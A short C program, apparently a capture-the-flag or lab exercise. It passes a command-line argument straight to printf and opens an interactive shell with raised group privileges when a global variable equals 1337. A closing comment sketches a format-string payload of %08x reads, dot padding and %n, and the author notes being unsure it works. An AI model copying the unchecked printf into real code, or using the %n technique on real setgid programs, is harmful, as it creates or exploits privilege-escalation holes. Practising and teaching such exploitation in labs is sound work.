#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);
    if (secret == 1337){
        give_shell();
    }
    return 0;
}
/*
  Get address of secret (from ptr)
  Shift stack to address
  Set secret to 1337 via padded chars in string (not sure if possible used dots)

  "%08x %08x %08x %08x %08x %08x ...................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................%n"
*/
